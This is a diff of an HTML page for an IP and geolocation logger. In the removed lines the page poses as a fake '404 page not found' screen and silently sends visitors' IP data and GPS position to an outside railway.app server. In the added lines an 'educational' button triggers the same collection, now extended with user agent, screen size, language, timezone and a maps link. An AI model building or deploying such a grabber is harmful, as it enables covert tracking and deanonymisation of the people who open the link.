@@ -1,38 +1,71 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>IP Logger</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Educational Location Tracker</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .card {
+      background: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #ccc;
+      text-align: center;
+    }
+    button {
+      background-color: #007bff;
+      color: white;
+      padding: 10px 20px;
+      font-size: 16px;
+      margin-top: 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
 </head>
 <body>
-<div style="display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column;">
-  <h2>Error 404</h2>
-  <h2>page not found</h2>
-</div>
-
+  <div class="card">
+    <h2>Educational Tracker</h2>
+    <p>This demo logs your IP and location (if allowed) for learning purposes only.</p>
+    <button onclick="startLogging()">Log My Info</button>
+  </div>
 
   <script>
-    // First get location from IP
-    fetch("http://ip-api.com/json")
-      .then(res => res.json())
-      .then(ipData => {
-        // Then try to get exact GPS location (with permission)
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            // If user allows location
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
+    function startLogging() {
+      fetch("https://ip-api.com/json")
+        .then(res => res.json())
+        .then(ipData => {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+              sendToServer(ipData, lat, lon);
+            },
+            (err) => {
+              console.warn("User denied GPS:", err.message);
+              sendToServer(ipData, null, null);
+            }
+          );
+        });
+    }
 
-            sendData(ipData, latitude, longitude);
-          },
-          (error) => {
-            // If user denies location
-            console.warn("GPS permission denied:", error.message);
-            sendData(ipData, null, null);
-          }
-        );
-      });
+    function sendToServer(ipData, lat, lon) {
+      const mapsURL = lat && lon ? `https://www.google.com/maps?q=${lat},${lon}` : null;
 
-    function sendData(ipData, lat, lon) {
       fetch("https://locationtracer-production.up.railway.app/log-ip", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -42,9 +75,16 @@
           city: ipData.city,
           isp: ipData.isp,
           latitude: lat,
-          longitude: lon
+          longitude: lon,
+          mapsLink: mapsURL,
+          userAgent: navigator.userAgent,
+          screenSize: `${window.innerWidth} x ${window.innerHeight}`,
+          language: navigator.language,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
         })
       });
+
+      alert("✅ Your info was logged for educational testing.");
     }
   </script>
 </body>
